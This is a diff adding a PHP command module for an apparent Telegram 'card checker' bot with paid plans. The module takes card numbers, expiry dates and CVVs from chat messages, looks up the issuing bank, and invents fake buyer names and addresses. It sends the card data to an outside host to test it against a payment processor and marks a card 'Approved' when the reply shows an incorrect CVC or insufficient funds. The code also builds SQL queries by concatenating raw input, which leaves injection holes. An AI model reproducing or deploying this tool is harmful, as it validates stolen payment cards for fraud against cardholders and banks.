@@ -1,0 +1,367 @@
+<?php
+require_once '/home/alvcarr230/www/project/data/data.php';
+list($cmd) = explode(" ", $text);
+if($cmd == "/zr" or $cmd == ".zr" or $cmd == "!zr" or $cmd == "?zr" or $cmd == "#zr" or $cmd == ":zr" or $cmd == ",zr"){ 
+// A part for gatecmd clearance
+   $gatecmd = 'le';
+
+    $lista = explode(" ", $text)[1];
+    
+//-------------[ MYSQL CALL PART] ----_-----//
+
+    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
+    $cs = mysqli_query(mysqlcon(),$SQL);
+    $raw = mysqli_fetch_assoc($cs);
+    $planexpiry = $raw['planexpiry'];
+     mysqli_close(mysqlcon());
+
+
+    $sql = "SELECT * FROM gateway WHERE gatecmd='$gatecmd'";
+    $cs = mysqli_query(mysqlcon(),$sql);
+    $raw = mysqli_fetch_assoc($cs);
+    $gatec = $raw['gatecmd'];
+     mysqli_close(mysqlcon());
+
+
+    $sql = "SELECT * FROM gateway WHERE gatecmd='le'";
+        $cs = mysqli_query(mysqlcon(),$sql);
+    $raw = mysqli_fetch_assoc($cs);
+    $status = $raw['status'];
+     mysqli_close(mysqlcon());
+
+    
+    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
+    $cs = mysqli_query(mysqlcon(),$sql);
+    $raw = mysqli_fetch_assoc($cs);
+    $plan = $raw['plan'];
+     mysqli_close(mysqlcon());
+    
+
+$sql = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
+    $cs = mysqli_query(mysqlcon(),$sql);
+    $raw = mysqli_fetch_assoc($cs);
+    $chats = $raw['chats'];
+    $now = time();
+    
+    /* This part for condition of gateways and some others*/
+    
+    if($status == "OFF"){
+        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ ", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+        SendMessage($content);
+        exit();
+    }
+    
+    
+
+      if ($planexpiry < $now && $planexpiry == 0) {
+    }
+elseif ($planexpiry < $now && $plan != "Free User") {
+    
+    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
+    $result = mysqli_query(mysqlcon(), $sql);
+    mysqli_close(mysqlcon());
+    
+    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
+    $result = mysqli_query(mysqlcon(), $sql);
+    mysqli_close(mysqlcon());
+    $content = ['chat_id' => $chat_id, 'text' => "$premium_expired", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+            $m1  = SendMessage($content);
+            exit();
+    }
+    
+    if($chats != $chat_id and $ctype == "supergroup"){
+        $content = ['chat_id' => $chat_id, 'text' => "$group_not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+        $m1  = SendMessage($content);
+        exit();
+    }
+    else{}
+
+    $SQL = "SELECT * FROM `administrar` WHERE plan=".$plan;
+    if(empty($plan)){
+        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+            $m1  = SendMessage($content);
+            exit();
+    }else{
+        
+    }
+    if($plan == "Free User" and $ctype == "private"){
+        $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+            $m1  = SendMessage($content);
+            exit();
+    }else{
+        
+    }
+    $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
+    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
+    $f = mysqli_num_rows($CONSULTA);
+
+    if($f > 0)
+    {} else{
+        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+        $m1  = SendMessage($content);
+        exit;
+    }
+    // if($plan == "Free User"){
+    //     $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+    //         $m1  = SendMessage($content);
+    //         exit();
+    // }
+    // else{} 
+    if (empty($lista)) {
+        $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Levi 🍃</code>
+<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
+<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+        $m1  = SendMessage($content);
+    } else {
+        $check = strlen($lista);
+        $chem = substr($lista, 0, 1);
+        $vaut = array(1, 2, 7, 8, 9, 0);
+        preg_match_all('/\d+/', $text, $matches);
+    if (count($matches[0]) == 3) {
+        $cc = $matches[0][0];
+        $mes = substr($matches[0][1], 0, 2);
+        $ano = substr($matches[0][1], -2);
+        $cvv = $matches[0][2];
+    } else if (strlen($matches[0][1]) == 3) {
+        $cc = $matches[0][0];
+        $ano1 = $matches[0][2];
+        $ano = $matches[0][3];
+        $cvv = $matches[0][1];
+        $mes = $ano1;
+    } else {
+        $cc = $matches[0][0];
+        $mes = $matches[0][1];
+        $ano = $matches[0][2];
+        $cvv = $matches[0][3];
+    }
+    $bin = substr($cc,0,6);
+    $first1 = substr($cc,0,1);
+
+    if($mes == "01"){
+        $sub_mes = "1";
+    }elseif($mes == "02"){
+        $sub_mes = "2";
+    }elseif($mes == "03"){
+        $sub_mes = "3";
+    }elseif($mes == "04"){
+        $sub_mes = "4";
+    }elseif($mes == "05"){
+        $sub_mes = "5";
+    }elseif($mes == "06"){
+        $sub_mes = "6";
+    }elseif($mes == "07"){
+        $sub_mes = "7";
+    }elseif($mes == "08"){
+        $sub_mes = "8";
+    }elseif($mes == "09"){
+        $sub_mes = "9";
+    }elseif($mes == "10"){
+        $sub_mes = "10";
+    }elseif($mes == "11"){
+        $sub_mes = "11";
+    }elseif($mes == "12"){
+        $sub_mes = "12";
+    }
+$cc1 = substr($cc, 0, 4);
+$cc2 = substr($cc, 4, -8);
+$cc3 = substr($cc, 8, -4);
+$cc4 = substr($cc, -4);
+
+        if (in_array($chem, $vaut)) {
+            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+            SendMessage($content);
+            exit();
+        } elseif ($check < 15) {
+            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+            SendMessage($content);
+            exit();
+        }
+        if (strlen($ano) == 2) {
+            $ano = "20" . $ano;
+        }
+        $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
+        $c = mysqli_query(mysqlcon(),$SQL);
+        
+        if($plan !== "Free User"){
+            $time = 40;
+        }else{
+            $time = 60;
+        }
+        
+        $RAW = mysqli_fetch_assoc($c);
+        $ANTISPAM = $RAW['antispam'];
+        $Rango = $RAW['rango'];
+        $TIMEAC = time() - $ANTISPAM;
+        if($TIMEAC < $time)
+        {
+            $TotalTime = $time - $TIMEAC;
+            if($TotalTime > 0){
+            $content = ['chat_id' => $chat_id, 'text' => "<b>[ANTISPAM] Try again after $TotalTime's</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+            $m1  = SendMessage($content);
+            exit;
+            }
+        }
+
+        $che = bannedbin($bin);
+        if($che == true){
+                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+                $m1  = SendMessage($content);
+                exit();
+        }
+        $timest = time();
+        $SQL = "UPDATE administrar SET antispam = '$timest' WHERE id=".$user_id;
+        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
+        $content = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
+<b>processing...[ 💳$lista ]</b>
+<b>-------------------------------------------------</b>
+<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $starttime</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
+      $m1  = SendMessage($content);
+        $m1i = $m1['result']['message_id'];
+
+$starttime = microtime(true);
+$mytime = 'time1';
+
+//==================[BIN LOOK-UP]======================//
+$url = 'https://projectslost.xyz/bin/?bin='.$bin.'';
+$fim = json_decode(file_get_contents($url), true);
+$level = $fim["level"];
+$type = $fim["type"];
+$brand = $fim["brand"];
+$country = $fim["country"]["name"];
+$currency = $fim["country"]["currency"];
+$bank = $fim['bank']["name"];
+$bankphone = $fim['bank']["phone"];
+$emoji = $fim["country"]["flag"];
+$pais = $fim["country"]["ISO2"];
+//==================[BIN LOOK-UP-END]======================//
+
+
+# ------------ Ramdom User ------------ #
+
+$name = ucfirst(str_shuffle('unodostrescuatro'));
+$last = ucfirst(str_shuffle('cincoseissieteocho'));
+$inc = ucfirst(str_shuffle('AmazonAppleas'));
+$email = "sexolandia".substr(md5(uniqid()), 0, 8)."@gmail.com";
+$street = "".rand(0000,9999)." Main Street";
+$ph = array("682","346","246");
+$ph1 = array_rand($ph);
+$phh = $ph[$ph1];
+$phone = "$phh".rand(0000000,9999999)."";
+$st = array("AL","NY","CA","FL","WA");
+$st1 = array_rand($st);
+$statee = $st[$st1];
+if ($statee == "NY"){
+$state = "New York";
+$zip = "10080";
+$city = "New York";
+}
+elseif ($statee == "WA"){
+$state = "Washington";
+$zip = "98001";
+$city = "Auburn";
+}
+elseif ($statee == "AL"){
+$state = "Alabama";
+$zip = "35005";
+$city = "Adamsville";
+}
+elseif ($statee == "FL"){
+$state = "Florida";
+$zip = "32003";
+$city = "Orange Park";
+}else{
+$state = "California";
+$zip = "90201";
+$city = "Bell";
+};
+function getDatas($string, $start,$end){
+    $uno = explode($start, $string);
+    $dos = explode($end,$uno[1]);
+    return $dos[0];
+}
+
+     
+$content2 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
+<b>processing...[🟡 - ? - ? ]</b>
+<b>-------------------------------------------------</b>
+<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $starttime</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
+$m2  = EditMessageText($content2);
+        $m2i = $m2['result']['message_id'];
+
+
+        
+        
+
+    
+    $content3 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
+<b>processing...[🟡 -🟠 - ? ]</b>
+<b>-------------------------------------------------</b>
+<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $starttime</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
+$m3  = EditMessageText($content3);
+        $m3i = $m3['result']['message_id'];
+
+
+                                      }
+
+
+/////////////////////////////////////////// Obtener Response
+$values = $cc|$mes|$ano|$cvv;
+$fi = json_decode(file_get_contents('https://juaneloapp.azurewebsites.net/apisfree/st.php?lista='.$values.''));
+$m = $fi['m'];
+$c = $fi['code'];
+//////////////////////////////////////////End Response
+
+     $content4 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
+<b>processing...[🟡 - 🟠 - 🟢 ]</b>
+<b>-------------------------------------------------</b>
+<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $time</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
+$m4  = EditMessageText($content4);
+        $m4i = $m4['result']['message_id'];
+
+
+//////////////////////////////////////////////// CHECK LIVE AND DEAD
+
+if($m == "Your card's security code is incorrect." || $m == "Your card has insufficient funds" || $c == "incorrect_cvc"){
+
+ $contentf = ['chat_id' => $chat_id, 'text' => "<b>-----------『↯𝐌𝐊𝐙↯』-----------</b>
+↳ Gateway Zoro[🍃]
+-----------------------------------------
+⎆𝐂𝐂» <code>$values</code>
+⎆𝐒𝐭𝐚𝐭𝐮𝐬» [ <code>Approved ✅</code> ]
+⎆𝐌𝐞𝐬𝐬𝐚𝐠𝐞» <code>$m | $c</code>
+-----------------------------------------
+⎆𝐁𝐢𝐧» <code>$bin</code>
+⎆𝐓𝐲𝐩𝐞» <code>$brand - $type - $level</code>
+⎆𝐁𝐚𝐧𝐤» <code>$bank</code>
+⎆𝐂𝐨𝐮𝐧𝐭𝐫𝐲» <code>$country - $pais - $emoji</code>
+------------------------------------------
+⎆𝙿𝚛𝚘𝚡𝚢» Live ✅
+⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <code><i>$time Seconds</i></code>
+⎆𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲» @$username <code><b>[$plan]</b></code>
+", 'message_id' => $m3i, 'parse_mode' => 'html'];
+        $m3  = EditMessageText($contentf);
+}else{
+
+ $contentf = ['chat_id' => $chat_id, 'text' => "<b>-----------『↯𝐌𝐊𝐙↯』-----------</b>
+↳ Gateway Zoro[🍃]
+-----------------------------------------
+⎆𝐂𝐂» <code>$values</code>
+⎆𝐒𝐭𝐚𝐭𝐮𝐬» [ <code>Declined ❌</code> ]
+⎆𝐌𝐞𝐬𝐬𝐚𝐠𝐞» <code>$m | $c</code>
+-----------------------------------------
+⎆𝐁𝐢𝐧» <code>$bin</code>
+⎆𝐓𝐲𝐩𝐞» <code>$brand - $type - $level</code>
+⎆𝐁𝐚𝐧𝐤» <code>$bank</code>
+⎆𝐂𝐨𝐮𝐧𝐭𝐫𝐲» <code>$country - $pais - $emoji</code>
+------------------------------------------
+⎆𝙿𝚛𝚘𝚡𝚢» Live ✅
+⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <code><i>$time Seconds</i></code>
+⎆𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲» @$username <code><b>[$plan]</b></code>
+", 'message_id' => $m3i, 'parse_mode' => 'html'];
+        $m3  = EditMessageText($contentf);
+}
+
+
+    }
+
+/*GATEWAY ON, NO TOCAR NADA SI NO DEJARA DE FUNCIONAR*/
